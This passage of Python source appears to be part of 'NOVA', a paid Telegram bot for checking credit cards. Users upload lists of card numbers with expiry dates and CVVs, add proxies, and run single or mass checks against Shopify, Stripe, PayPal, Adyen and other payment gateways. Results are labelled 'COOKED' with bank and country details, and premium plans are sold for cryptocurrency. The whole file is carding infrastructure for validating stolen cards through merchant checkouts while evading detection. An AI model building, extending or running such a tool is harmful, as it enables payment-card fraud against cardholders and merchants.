1️⃣ Upload a <code>.txt</code> file with cards (one per line: <code>CC|MM|YYYY|CVV</code>)
2️⃣ Add working proxies via <b>Proxy Manager</b>
3️⃣ Click a gate below or type <code>/msh</code>

<b>🔹 Free User Limits (per check):</b>
• 🛍️ Shopify Multi‑Site : <b>1000</b> cards
• 🔷 B3 Auth : <b>500</b> cards
• 💰 PayPal / Stripe / Others : <b>200</b> cards

<i>💎 Upgrade to Premium for higher limits!</i>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>
"""
    bot.edit_message_text(
        info_text,
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode='HTML',
        reply_markup=markup
    )


# ============================================================================
# PROXY & SITE MANAGEMENT MENUS
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data == "menu_proxy")
def proxy_menu_callback(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("➕ Add Proxy", callback_data="proxy_add_prompt"),
        types.InlineKeyboardButton("📂 Upload Proxy File", callback_data="proxy_upload_prompt"),
        types.InlineKeyboardButton("📋 View My Proxies", callback_data="proxy_view"),
        types.InlineKeyboardButton("🧹 Clean Dead Proxies", callback_data="proxy_clean"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start")
    )
    bot.edit_message_text(
        "<b>🛡️ Proxy Manager</b>\n\n"
        "Proxies are required for checking. Add your own or use global ones (if owner).",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode='HTML',
        reply_markup=markup
    )
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data == "proxy_add_prompt")
def proxy_add_prompt(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id,
        "📝 <b>Send me a proxy in format:</b>\n<code>ip:port:user:pass</code>",
        parse_mode='HTML')
    bot.register_next_step_handler(call.message, process_add_proxy_manual)


def process_add_proxy_manual(message):
    handle_add_proxy_command(message)


@bot.callback_query_handler(func=lambda call: call.data == "proxy_upload_prompt")
def proxy_upload_prompt(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id,
        "📂 <b>Send me a .txt file with proxies (one per line).</b>",
        parse_mode='HTML')


@bot.callback_query_handler(func=lambda call: call.data == "proxy_view")
def proxy_view_callback(call):
    user_id = call.from_user.id
    user_proxies = get_user_proxies(user_id)
    if not user_proxies:
        text = "❌ You have no personal proxies."
    else:
        text = f"<b>🌐 Your Proxies ({len(user_proxies)}):</b>\n\n" + "\n".join(user_proxies[:20])
        if len(user_proxies) > 20:
            text += f"\n\n... and {len(user_proxies)-20} more"
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, text, parse_mode='HTML')


@bot.callback_query_handler(func=lambda call: call.data == "proxy_clean")
def proxy_clean_callback(call):
    bot.answer_callback_query(call.id, "Starting cleanup...")
    handle_clean_my_proxies(call.message)


@bot.callback_query_handler(func=lambda call: call.data == "menu_sites")
def site_menu_callback(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("➕ Add Site", callback_data="site_add_prompt"),
        types.InlineKeyboardButton("📋 View My Sites", callback_data="site_view"),
        types.InlineKeyboardButton("🔍 Show Site Details", callback_data="site_show_prompt"),
        types.InlineKeyboardButton("🗑️ Remove Site", callback_data="site_remove_prompt"),
        types.InlineKeyboardButton("🧹 Clear All My Sites", callback_data="site_clear"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start")
    )
    bot.edit_message_text(
        "<b>🌐 Personal Site Manager</b>\n\n"
        "<b>Commands:</b>\n"
        "<code>/addmysite &lt;url&gt;</code> – Add one or multiple sites\n"
        "<code>/mysites</code> – List your sites (ID & price)\n"
        "<code>/showmyid &lt;id&gt;</code> – View full site details\n"
        "<code>/rmmyid &lt;id&gt;</code> – Remove a site by ID\n"
        "<code>/clearmysites</code> – Remove all your sites\n\n"
        "<i>Use the buttons below for guided setup.</i>",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode='HTML',
        reply_markup=markup
    )
    bot.answer_callback_query(call.id)


# Add these new callbacks (place after the menu)
@bot.callback_query_handler(func=lambda call: call.data == "site_show_prompt")
def site_show_prompt(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id,
        "🔍 <b>Enter the site ID to view details:</b>\n"
        "Use <code>/showmyid 5</code> or reply with just the number.",
        parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "site_remove_prompt")
def site_remove_prompt(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id,
        "🗑️ <b>Enter the site ID to remove:</b>\n"
        "Use <code>/rmmyid 5</code> or reply with just the number.",
        parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "menu_settings")
def menu_settings_callback(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💰 Set Price Filter", callback_data="set_price_menu"),
        types.InlineKeyboardButton("🔄 Refresh Session", callback_data="back_to_start"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start")
    )
    bot.edit_message_text(
        "<b>⚙️ Settings</b>\n\nCustomize your experience.",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode='HTML',
        reply_markup=markup
    )
    bot.answer_callback_query(call.id)


# ============================================================================
# PLANS & PAYMENTS (with premium styling)
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data == "show_plans")
def show_plans_callback(call):
    plans_text = """
<pre>┌─────────────────────────────────┐
│      💎  PREMIUM  PLANS  💎      │
└─────────────────────────────────┘</pre>

🔹 <b>Trial</b> — 7 days · <code>$7</code>
   └ <i>Perfect for testing</i>

🔹 <b>Elite</b> — 15 days · <code>$14</code>
   └ <i>Most popular</i>

🔹 <b>Pro</b> — 30 days · <code>$20</code>
   └ <i>Best value</i>

🔹 <b>Quarterly</b> — 90 days · <code>$50</code>
   └ <i>Power user</i>

<i>All plans include unlimited checks and priority support.</i>
"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🛒 Trial ($7)", callback_data="buy_trial"),
        types.InlineKeyboardButton("🛒 Elite ($14)", callback_data="buy_elite")
    )
    markup.add(
        types.InlineKeyboardButton("🛒 Pro ($20)", callback_data="buy_pro"),
        types.InlineKeyboardButton("🛒 Qtr ($50)", callback_data="buy_qtr")
    )
    markup.add(types.InlineKeyboardButton("🎟️ Redeem Code", callback_data="redeem_code"))
    markup.add(types.InlineKeyboardButton("👨‍💻 Contact Admin", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start"))

    try:
        bot.edit_message_text(plans_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
    except:
        bot.send_message(call.message.chat.id, plans_text, parse_mode='HTML', reply_markup=markup)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def process_buy_click(call):
    bot.answer_callback_query(call.id, "Generating secure invoice...")
    if call.data == "buy_trial": price, days, plan_name = 7, 7, "Trial"
    elif call.data == "buy_elite": price, days, plan_name = 14, 15, "Elite"
    elif call.data == "buy_pro": price, days, plan_name = 20, 30, "Pro"
    elif call.data == "buy_qtr": price, days, plan_name = 50, 90, "Quarterly"
    else: return

    pay_url, invoice_id = create_crypto_invoice(amount=price, currency="USDT", description=f"Nova CC: {plan_name}")
    if pay_url and invoice_id:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(f"💸 Pay ${price} via @CryptoBot", url=pay_url))
        markup.add(types.InlineKeyboardButton("🔄 I have paid (Verify)", callback_data=f"verify_{invoice_id}_{days}"))
        markup.add(types.InlineKeyboardButton("🔙 Cancel", callback_data="show_plans"))
        invoice_text = f"""
<pre>┌─────────────────────────────────┐
│        🧾  INVOICE  READY        │
└─────────────────────────────────┘</pre>

<b>🛒 Item:</b> {plan_name} ({days} Days)
<b>💰 Amount:</b> ${price} USDT

<i>1. Click 'Pay via @CryptoBot'
2. Complete payment
3. Click 'I have paid' to activate</i>
"""
        bot.edit_message_text(invoice_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
    else:
        bot.answer_callback_query(call.id, "❌ Error generating invoice. Contact Admin.", show_alert=True)


# ============================================================================
# PAYMENT VERIFICATION (unchanged core, premium styling)
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("verify_"))
def verify_payment_callback(call):
    try:
        _, invoice_id, plan_days = call.data.split("_")
        plan_days = int(plan_days)
    except ValueError:
        bot.answer_callback_query(call.id, "❌ Invalid button data.", show_alert=True)
        return

    user_id = str(call.from_user.id)
    bot.answer_callback_query(call.id, "🔄 Checking blockchain...")
    url = f"https://pay.crypt.bot/api/getInvoices?invoice_ids={invoice_id}"
    headers = {"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN}
    try:
        response = requests.get(url, headers=headers)
        data = response.json()
        if data["ok"] and data["result"]["items"]:
            status = data["result"]["items"][0]["status"]
            if status == "paid":
                now = datetime.now()
                if user_id in users_data and 'expiry' in users_data[user_id]:
                    cur = datetime.fromisoformat(users_data[user_id]['expiry'])
                    new_exp = (cur if cur > now else now) + timedelta(days=plan_days)
                else:
                    new_exp = now + timedelta(days=plan_days)
                users_data[user_id] = {
                    "expiry": new_exp.isoformat(),
                    "limit": 1000,
                    "usage_today": 0,
                    "last_check_date": now.strftime('%Y-%m-%d'),
                    "daily_limit": 10000
                }
                save_json(USERS_FILE, users_data)
                success_text = f"""
<pre>┌─────────────────────────────────┐
│      🎉  PAYMENT  SUCCESS  🎉     │
└─────────────────────────────────┘</pre>

✅ <b>Invoice:</b> #{invoice_id}
💎 <b>Status:</b> Account Upgraded!
⏳ <b>Time Added:</b> {plan_days} Days
📅 <b>New Expiry:</b> {new_exp.strftime('%Y-%m-%d')}

<i>Welcome! Use /start to begin.</i>
"""
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_start"))
                bot.edit_message_text(success_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
                try:
                    bot.send_message(DARKS_ID, f"💰 <b>NEW SALE!</b>\nUser <code>{user_id}</code> bought {plan_days} days.", parse_mode='HTML')
                except: pass
            elif status == "active":
                bot.answer_callback_query(call.id, "⏳ Payment not detected yet. Wait a moment.", show_alert=True)
            elif status == "expired":
                bot.answer_callback_query(call.id, "❌ Invoice expired. Generate a new one.", show_alert=True)
            else:
                bot.answer_callback_query(call.id, f"⚠️ Status: {status}", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "❌ Invoice not found.", show_alert=True)
    except Exception as e:
        print(f"Verify error: {e}")
        bot.answer_callback_query(call.id, "❌ API error. Try again.", show_alert=True)


# ============================================================================
# ACCOUNT INFO (Premium Panel)
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data == "show_info")
def show_info_callback(call):
    user_id = call.from_user.id
    user_str = str(user_id)
    if is_owner(user_id):
        info = f"""
<pre>┌─────────────────────────────────┐
│        👑  GOD  MODE  👑         │
└─────────────────────────────────┘</pre>
🆔 <b>User ID:</b> <code>{html.escape(user_str)}</code>
💠 <b>Status:</b> 🌌 Supreme Overlord
♾️ <b>Access:</b> Unlimited everything.
"""
    elif user_str in users_data:
        data = users_data[user_str]
        expiry = datetime.fromisoformat(data['expiry'])
        days_left = (expiry - datetime.now()).days
        is_active = expiry > datetime.now()
        role = "✅ Active Premium" if is_active else "⏳ Expired"
        info = f"""
<pre>┌─────────────────────────────────┐
│      💎  VIP  ACCOUNT  💎        │
└─────────────────────────────────┘</pre>
🆔 <b>User ID:</b> <code>{html.escape(user_str)}</code>
🎖️ <b>Status:</b> {role}
⏳ <b>Expires:</b> {expiry.strftime('%Y-%m-%d')} ({days_left} days)
🚀 <b>Batch Limit:</b> {data.get('limit', 1000)}
📈 <b>Daily Usage:</b> {data.get('usage_today',0)}/{data.get('daily_limit',10000)}
"""
        if not is_active:
            info += "\n⚠️ <i>Your subscription has expired. Renew to continue.</i>"
    else:
        info = f"""
<pre>┌─────────────────────────────────┐
│      🪫  FREE  ACCOUNT  🪫       │
└─────────────────────────────────┘</pre>
🆔 <b>User ID:</b> <code>{html.escape(user_str)}</code>
🔒 <b>Status:</b> Not approved
💡 <i>Get a plan or use a code to unlock all features.</i>
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💎 View Plans", callback_data="show_plans"))
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start"))
    try:
        bot.edit_message_text(info, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML', reply_markup=markup)
    except:
        bot.send_message(call.message.chat.id, info, parse_mode='HTML', reply_markup=markup)
    bot.answer_callback_query(call.id)


# ============================================================================
# HELP & OWNER PANEL (Updated)
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data == "show_help")
def show_help_callback(call):
    help_text = """
<b>📖 QUICK START</b>
1️⃣ Join our channel (required)
2️⃣ Add proxies: <code>/addpro ip:port:user:pass</code>
3️⃣ Upload cards (.txt) or use buttons below
4️⃣ For mass check, upload file then select gate

<b>🛡️ PROXY</b>
<code>/addpro</code> – add proxy
<code>/cleanmyproxies</code> – remove dead

<b>💳 CARDS</b>
<code>/sh</code> – Shopify single check
<code>/stripe</code> / <code>/chk</code> – Stripe Auth
<code>cook</code> – Shopify alias
Use <b>Single Check</b> or <b>Mass Check</b> menu for more.

<b>🌐 PERSONAL SITES</b>
<code>/addmysite &lt;url&gt;</code> – Add your own Shopify site(s)
<code>/mysites</code> – List your sites (ID & price)
<code>/showmyid &lt;id&gt;</code> – View full site details
<code>/rmmyid &lt;id&gt;</code> – Remove a site
<code>/clearmysites</code> – Clear all your sites

<b>👤 ACCOUNT</b>
<code>/info</code> – Account status
<code>/start</code> – Main menu

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>⚡ NOVA · <a href="tg://user?id=5963548505">⏤‌‌Unknownop ꯭𖠌</a></i>
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start"))
    try:
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
    except:
        bot.send_message(call.message.chat.id, help_text, parse_mode='HTML', reply_markup=markup)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "show_owner")
def show_owner_callback(call):
    if not is_owner(call.from_user.id):
        bot.answer_callback_query(call.id, "🚫 Restricted: Supreme Overlords Only.", show_alert=True)
        return

    bot.answer_callback_query(call.id)

    owner_text = """
<pre>┌─────────────────────────────────┐
│        👑  OWNER  PANEL  👑      │
└─────────────────────────────────┘</pre>

<b>🌐 GLOBAL SITE MANAGEMENT</b>
<code>/addurls</code> – Add sites from .txt file (auto ID)
<code>/viewsites</code> – List all site IDs and prices
<code>/showid &lt;id&gt;</code> – Show full details of a site
<code>/rmsiteid &lt;id&gt;</code> – Remove site by ID
<code>/rsite &lt;url&gt;</code> – Remove all sites matching URL
<code>/rmsites</code> – Remove ALL sites
<code>/cleansites</code> – Remove dead sites
<code>/addsingleurls</code> – Add single‑check sites
<code>/viewsinglesites</code> – List single‑check sites
<code>/rmsinglesite &lt;url&gt;</code> – Remove single site
<code>/cleansinglesites</code> – Clean single‑check sites
<code>/cleanfile</code> – Clean URLs from .txt file
<code>/splitsite N</code> – Split site list into N parts
<code>/listsite [cat ID|price max]</code> – Export filtered sites

<b>🛡️ PROXY MANAGEMENT</b>
<code>/addpro ip:port:user:pass</code> – Add single proxy
<code>/addproxies</code> – Add proxies from .txt file
<code>/cleanpro</code> – Remove dead global proxies
<code>/rmpro</code> – Remove ALL proxies

<b>👥 USER MANAGEMENT</b>
<code>/pro &lt;userid&gt; &lt;days&gt;</code> – Approve user
<code>/limit &lt;userid&gt; &lt;new_limit&gt;</code> – Change per‑upload limit
<code>/setlimit &lt;userid&gt; &lt;daily_limit&gt;</code> – Change daily limit
<code>/resetusage &lt;userid&gt;</code> – Reset daily usage
<code>/rmuser &lt;userid&gt;</code> – Remove/ban user
<code>/grant &lt;chatid&gt;</code> – Approve group
<code>/users</code> – List approved users
<code>/groups</code> – List approved groups

<b>💰 REDEEM CODES</b>
<code>/redeem &lt;days&gt; [count]</code> – Generate trial codes

<b>⚙️ GATE LIMITS</b>
<code>/setgatelimit &lt;gate&gt; &lt;max&gt;</code> – Set mass check limit per gate

<b>📊 BOT MANAGEMENT</b>
<code>/stats</code> – Show statistics
<code>/ping</code> – Check latency
<code>/restart</code> – Restart bot
<code>/setamo</code> – Set price filter for Shopify
<code>/broadcast &lt;msg&gt;</code> – Send announcement to all users/groups
<code>/forceunlock &lt;userid&gt;</code> – Release stuck user lock

<b>📁 FILE SPLITTING</b>
<code>/splitfile N</code> – Split uploaded .txt into N parts

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>⚡ NOVA · <a href="tg://user?id=5963548505">⏤‌‌Unknownop ꯭𖠌</a></i>
"""

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start"))

    try:
        bot.edit_message_text(owner_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
    except Exception:
        bot.send_message(call.message.chat.id, owner_text, parse_mode='HTML', reply_markup=markup)

# ============================================================================
# BACK TO START (Refreshed)
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start_callback(call):
    user_name = call.from_user.first_name or "User"
    user_id = call.from_user.id
    user_str = str(user_id)
    is_premium = False
    if user_str in users_data:
        try:
            expiry = datetime.fromisoformat(users_data[user_str]['expiry'])
            if expiry > datetime.now():
                is_premium = True
        except:
            pass
    status_badge = "💎 PREMIUM" if is_premium else "🆓 FREE"
    ref_link = get_referral_link(user_id)
    ref_count = len(referrals_data.get(user_str, {}).get("referred", []))

    welcome_text = f"""
<pre>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  <b>🔥   N O V A   ·   V E R I F Y   🔥</b>  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛</pre>

<b>👋 Welcome back, {html.escape(user_name)}!</b>
<b>📊 Status:</b> {status_badge}

<b>🔗 Your Referral Link:</b>
<code>{ref_link}</code>
👥 <b>Referrals:</b> {ref_count} (3 = 1 free day)
"""
    footer = "\n\n<pre>━━━━━━━━━━━━━━━━━━━━━━━━━</pre>\n<i>⚡ NOVA · <a href=\"tg://user?id=5963548505\">⏤‌‌Unknownop ꯭𖠌</a></i>"
    full_text = welcome_text + footer

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💳 Single Check", callback_data="menu_single_gate"),
        types.InlineKeyboardButton("📦 Mass Check", callback_data="menu_mass_gate")
    )
    markup.add(
        types.InlineKeyboardButton("🛡️ Proxy Manager", callback_data="menu_proxy"),
        types.InlineKeyboardButton("🌐 Site Manager", callback_data="menu_sites")
    )
    markup.add(
        types.InlineKeyboardButton("💎 Plans", callback_data="show_plans"),
        types.InlineKeyboardButton("👤 Account", callback_data="show_info")
    )
    markup.add(
        types.InlineKeyboardButton("📖 Help", callback_data="show_help"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
    )
    if is_owner(call.from_user.id):
        markup.add(types.InlineKeyboardButton("👑 Owner Panel", callback_data="show_owner"))

    try:
        bot.edit_message_text(full_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='HTML', reply_markup=markup)
    except:
        bot.send_message(call.message.chat.id, full_text, parse_mode='HTML', reply_markup=markup)
    bot.answer_callback_query(call.id)

# ============================================================================
# SINGLE-CHECK SLASH COMMANDS (Direct Access)
# ============================================================================

# Mapping of command names to (gate_function, display_name)
SINGLE_GATE_COMMANDS = {
    'sh': (None, 'Shopify'),           # Shopify uses special handler
    's': (None, 'Shopify'),
    'pp': (check_paypal_fixed, 'PayPal Fixed'),
    'pp2': (check_paypal_general, 'PayPal General'),
    'stripe': (check_stripe_api, 'Stripe Auth'),
    'st': (check_stripe_onyx, 'Stripe Auth'),
    'chk': (check_b3_auth, 'Stripe Auth'),   # now points to working Stripe
    'ch': (check_chaos, 'Chaos Auth'),
    'chaos': (check_chaos, 'Chaos Auth'),
    'ad': (check_adyen, 'Adyen Auth'),
    'adyen': (check_adyen, 'Adyen Auth'),
    'ap': (check_app_auth, 'App Based Auth'),
    'app': (check_app_auth, 'App Based Auth'),
    'arc': (check_arcenus, 'Arcenus'),
    'arcenus': (check_arcenus, 'Arcenus'),
    'ppay': (check_paypal_onyx, 'PayPal (Onyx)'),
}


@bot.message_handler(commands=list(SINGLE_GATE_COMMANDS.keys()))
@flood_control
@force_subscribe_and_name
def handle_single_gate_command(message):
    """Handle all single-check gate commands."""
    cmd = message.text.split()[0].lstrip('/').lower()
    gate_info = SINGLE_GATE_COMMANDS.get(cmd)
    if not gate_info:
        return

    gate_func, gate_name = gate_info

    # Extract CC
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, f"Usage: /{cmd} CC|MM|YYYY|CVV")
        return

    cc_text = parts[1]
    cc = extract_cc(cc_text)
    if not cc:
        bot.reply_to(message, "Invalid CC format. Use CC|MM|YYYY|CVV.")
        return

    # For Shopify, use existing handler
    if cmd in ['sh', 's']:
        process_cc_check(message)
        return

    # For all other gates
    user_id = message.from_user.id
    # Get proxy
    user_proxies = get_user_proxies(user_id)
    if user_proxies:
        proxy = random.choice(user_proxies)
    else:
        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

    processing_msg = bot.send_message(message.chat.id, f"⏳ Checking with {gate_name}...")
    start_time = time.time()

    try:
        msg, status = gate_func(cc, proxy=proxy)
    except Exception as e:
        msg, status = str(e), "ERROR"

    time_taken = round(time.time() - start_time, 2)
    bin_info = get_bin_info(cc.split('|')[0])

    first = message.from_user.first_name or ""
    last = message.from_user.last_name or ""
    full_name = f"{first} {last}".strip()

    final_message = format_message(
        cc=cc,
        response=msg,
        status=status,
        gateway=gate_name,
        price="0.00$",
        bin_info=bin_info,
        user_id=user_id,
        full_name=full_name,
        time_taken=time_taken,
        proxy_used=proxy
    )

    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        parse_mode='HTML'
    )
# ============================================================================
# STANDARD COMMAND HANDLERS (fallback)
# ============================================================================
@bot.message_handler(commands=['help'])
@flood_control
@force_subscribe_and_name
def send_help(message):
    show_help_callback(type('obj', (object,), {'message': message, 'id': 1, 'data': 'show_help'}))


@bot.message_handler(commands=['owner'])
@flood_control
@force_subscribe_and_name
def send_owner_help(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Restricted.")
        return
    show_owner_callback(type('obj', (object,), {'from_user': message.from_user, 'message': message, 'id': 1, 'data': 'show_owner'}))
    
    
@bot.message_handler(commands=['sh', 's'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith(('.sh', '.s', 'cook', 'Cook'))))
@flood_control
@force_subscribe_and_name
def handle_cc_check(message):
    """Wrapper to run the check in a separate thread."""
    thread = threading.Thread(target=process_cc_check, args=(message,))
    thread.start()


def process_cc_check(message):
    # Extract CC from command or replied message
    cc_text = None
    if message.text and message.text.startswith(('/sh', '/s', '.sh', '.s', 'cook', 'Cook')):
        parts = message.text.split(maxsplit=1)
        if len(parts) > 1:
            cc_text = parts[1]
    if not cc_text and message.reply_to_message:
        cc_text = message.reply_to_message.text

    if not cc_text:
        bot.reply_to(message, "❌ Please provide a card.\nFormat: <code>/sh CC|MM|YYYY|CVV</code>", parse_mode='HTML')
        return

    cc = extract_cc(cc_text)
    if not cc:
        bot.reply_to(message, "❌ Invalid card format. Use <code>CC|MM|YYYY|CVV</code>", parse_mode='HTML')
        return

    status_msg = bot.send_message(message.chat.id, "⏳ <b>Checking card...</b>", parse_mode='HTML')

    # Choose proxy
    user_proxies = get_user_proxies(message.from_user.id)
    proxy = random.choice(user_proxies) if user_proxies else (
        random.choice(proxies_data['proxies']) if proxies_data.get('proxies') else None
    )

    # Get sites
    if single_sites_data.get('sites'):
        sites = single_sites_data['sites']
    else:
        sites = get_filtered_sites()

    if not sites:
        bot.edit_message_text("❌ No sites available.", message.chat.id, status_msg.message_id)
        return

    max_attempts = 4
    shuffled_sites = random.sample(sites, min(max_attempts, len(sites)))

    final_response = None
    final_status = None
    final_gateway = None
    final_price = None
    final_site_url = None
    final_site_obj = None   # <-- store site object

    for site_obj in shuffled_sites:
        site_url = site_obj['url']
        price = site_obj.get('price', '0.00')

        try:
            from gates import check_shopify_api, process_shopify_api_response
            api_response = check_shopify_api(site_url, cc, proxy)
            response_text, status, gateway = process_shopify_api_response(api_response, price)
            if "CAPTCHA" in response_text.upper():
                continue

            final_response = response_text
            final_status = status
            final_gateway = gateway
            final_price = price
            final_site_url = site_url
            final_site_obj = site_obj   # <-- save it
            break

        except Exception as e:
            continue

    if final_response is None:
        if shuffled_sites:
            last_site = shuffled_sites[-1]
            try:
                api_response = check_shopify_api(last_site['url'], cc, proxy)
                final_response, final_status, final_gateway = process_shopify_api_response(api_response, last_site.get('price', '0.00'))
                final_price = last_site.get('price', '0.00')
                final_site_url = last_site['url']
                final_site_obj = last_site
            except:
                final_response = "All sites failed (CAPTCHA/Error)"
                final_status = "ERROR"
                final_gateway = "Shopify Payments"
                final_price = "0.00"
                final_site_url = "N/A"
        else:
            final_response = "No sites available"
            final_status = "ERROR"
            final_gateway = "Unknown"
            final_price = "0.00"
            final_site_url = "N/A"

    # BIN info from API only
    bin_info = get_bin_info_api(cc.split('|')[0])

    # Build site display: ID if available, else domain
    if final_site_obj and final_site_obj.get('id'):
        site_display = f"ID {final_site_obj.get('id')}"
    else:
        site_display = final_site_url.replace('https://', '').replace('http://', '').split('/')[0] if final_site_url != 'N/A' else 'N/A'

    emoji = "🔥" if final_status == "APPROVED" else ("✅" if final_status == "APPROVED_OTP" else "❌")
    status_display = "COOKED" if final_status == "APPROVED" else ("APPROVED (OTP)" if final_status == "APPROVED_OTP" else "DECLINED")

    result_text = f"""
<pre>┌─────────────────────────────────┐
│  {status_display} {emoji}
└─────────────────────────────────┘</pre>

<b>💳 Card</b>      : <code>{cc}</code>
<b>📋 Response</b>   : {final_response}
<b>🛡️ Gateway</b>    : {final_gateway}  ·  <b>${final_price}</b>

<pre>├─────────────────────────────────┤</pre>
<b>🏦 Bank</b>       : <b>{bin_info.get('bank', 'UNKNOWN')}</b>
<b>🌍 Country</b>    : {bin_info.get('country_name', 'UNKNOWN')} {bin_info.get('country_flag', '🇺🇳')}
<b>💠 Brand</b>      : {bin_info.get('brand', 'UNKNOWN')} {bin_info.get('type', 'UNKNOWN')}
<pre>└─────────────────────────────────┘</pre>
<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>
"""
    try:
        bot.edit_message_text(result_text, message.chat.id, status_msg.message_id, parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, result_text, parse_mode='HTML')

@bot.message_handler(commands=['forceunlock'])
def handle_force_unlock(message):
    if not is_owner(message.from_user.id):
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /forceunlock <user_id>")
            return
        target_id = int(parts[1])
        # Release user busy lock
        set_user_busy(target_id, False)
        # Release global semaphore if it was stuck (only if it was acquired)
        try:
            mass_check_semaphore.release()
        except:
            pass
        # Clear stop flag for that chat (if any)
        clear_stop(message.chat.id)
        bot.reply_to(message, f"✅ User {target_id} unlocked.\nGlobal semaphore reset.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
# ============================================================================
# Generic handler for Onyx API single checks
# ============================================================================

def handle_onyx_gate(message, gate_func, gate_name):
    """Generic handler for a single Onyx gate."""
    user_id = message.from_user.id
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, f"Usage: /{gate_name.lower().replace(' ', '')} CC|MM|YYYY|CVV")
        return

    cc_text = parts[1]
    cc = extract_cc(cc_text)
    if not cc:
        bot.reply_to(message, "Invalid CC format. Use CC|MM|YYYY|CVV.")
        return

    # Use user's personal proxy if available
    user_proxies = get_user_proxies(user_id)
    if user_proxies:
        proxy = random.choice(user_proxies)
    else:
        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

    processing_msg = bot.send_message(message.chat.id, f"⏳ Checking with {gate_name}...")
    start_time = time.time()

    try:
        msg, status = gate_func(cc, proxy=proxy)
    except Exception as e:
        msg, status = str(e), "ERROR"

    time_taken = round(time.time() - start_time, 2)
    bin_info = get_bin_info(cc.split('|')[0])
    first = message.from_user.first_name or ""
    last = message.from_user.last_name or ""
    full_name = f"{first} {last}".strip()

    final_message = format_message(
        cc=cc,
        response=msg,
        status=status,
        gateway=gate_name,
        price="0.00$",
        bin_info=bin_info,
        user_id=user_id,
        full_name=full_name,
        time_taken=time_taken,
        proxy_used=proxy
    )
    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        parse_mode='HTML'
    )


# Mapping of command names to (gate_function, display_name)
ONYX_GATES = {
    'chaos': (check_chaos, 'Chaos Auth'),
    'ad': (check_adyen, 'Adyen Auth'),
    'ap': (check_app_auth, 'App Based Auth'),
    'st': (check_stripe_onyx, 'Stripe Auth'),
    'arc': (check_arcenus, 'Arcenus'),
    'ppay': (check_paypal_onyx, 'PayPal (Onyx)'),
}

